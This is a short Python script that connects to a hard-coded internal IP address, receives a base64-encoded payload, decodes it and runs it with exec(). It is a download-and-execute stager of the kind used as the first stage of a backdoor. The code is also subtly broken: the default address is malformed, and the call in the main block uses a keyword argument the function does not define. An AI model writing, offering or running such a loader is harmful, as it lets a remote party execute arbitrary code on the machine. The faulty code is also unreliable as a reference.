#!/usr/bin/env python3
import socket
import base64

def client(connectto='127.0.01',port=12345):
    '''Connects to a server and attempts to base64 decode and execute the received payload
    Args:
        connectto (str): IPv4 address in dotted decimal notation of the server to connect to
        port (int): port number that the server is listening on
    Returns:
        None
    '''
    s = socket.socket()
    s.connect((connectto, port))

    payload = bytearray() # extend this bytearray with data received until 0 bytes received
    chunk = s.recv(4096)
    while chunk:
        payload.extend(chunk)
        chunk = s.recv(4096)

    exec(base64.decodebytes(payload))

if __name__ == '__main__':
    client(connectionto='10.50.20.70')
